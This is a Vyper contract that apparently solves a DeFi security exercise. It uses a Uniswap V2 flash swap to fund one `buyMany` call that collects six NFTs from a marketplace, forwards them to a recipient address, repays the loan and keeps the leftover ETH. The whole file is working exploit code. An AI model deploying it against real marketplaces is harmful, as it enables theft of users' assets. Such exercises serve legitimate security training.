# @version ^0.3.7

from vyper.interfaces import ERC20 as IERC20
from vyper.interfaces import ERC721 as IERC721

interface IUniswapV2Factory:
    def getPair(
        token_a: address,
        token_b: address,
    ) -> address: view

interface IUniswapV2Pair:
    def swap(
        amount0Out: uint256,
        amount1Out: uint256,
        to: address,
        data: Bytes[64],
    ): nonpayable

interface IWETH:
    def withdraw(amount: uint256): nonpayable

owner: immutable(address)

factory: address
marketplace: address
weth: address
token: address
nft: address
dev: address

@external
@payable
def __init__(
    _factory: address,
    _marketplace: address,
    _weth: address,
    _token: address,
    _nft: address,
    _dev: address,
):
    owner = msg.sender
    self.factory = _factory
    self.marketplace = _marketplace
    self.weth = _weth
    self.token = _token
    self.nft = _nft
    self.dev = _dev

@external
def attack(borrow_amount: uint256):
    assert msg.sender == owner, "!owner"
    pair: address = IUniswapV2Factory(self.factory).getPair(self.weth, self.token)
    assert pair != empty(address), "!pair"
    data: Bytes[64] = _abi_encode(borrow_amount, pair)
    IUniswapV2Pair(pair).swap(
       borrow_amount,
       0,
       self,
       data,
    )
    send(owner, self.balance)

@external
def uniswapV2Call(
    _sender: address,
    _amount0: uint256,
    _amount1: uint256,
    _data: Bytes[64]
):
    assert _sender == self, "!sender"
    pair: address = empty(address)
    borrow_amount: uint256 = empty(uint256)
    borrow_amount, pair = _abi_decode(_data, (uint256, address))
    assert msg.sender == pair, "!pair"

    IWETH(self.weth).withdraw(borrow_amount)
    
    token_ids: DynArray[uint256, 6] = [0, 1, 2, 3, 4, 5]

    raw_call(
        self.marketplace,
        _abi_encode(
            token_ids,
            method_id=method_id("buyMany(uint256[])")
        ),
        value=borrow_amount,
    )
    calldata: Bytes[32] = _abi_encode(self)

    for token_id in token_ids:
        IERC721(self.nft).safeTransferFrom(self, self.dev, token_id, calldata)

    fee: uint256 = ((borrow_amount * 3) / 997) + 1
    repay: uint256 = borrow_amount + fee

    raw_call(self.weth, b"", value=repay)

    IERC20(self.weth).transfer(pair, repay)

@external
def onERC721Received(
    operator: address,
    sender: address,
    tokenId: uint256,
    data: Bytes[1024]
) -> bytes4:
    assert msg.sender == self.nft, "!nft"
    return convert(
        method_id("onERC721Received(address,address,uint256,bytes)"),
        bytes4,
    )

@external
@payable
def __default__():
    pass
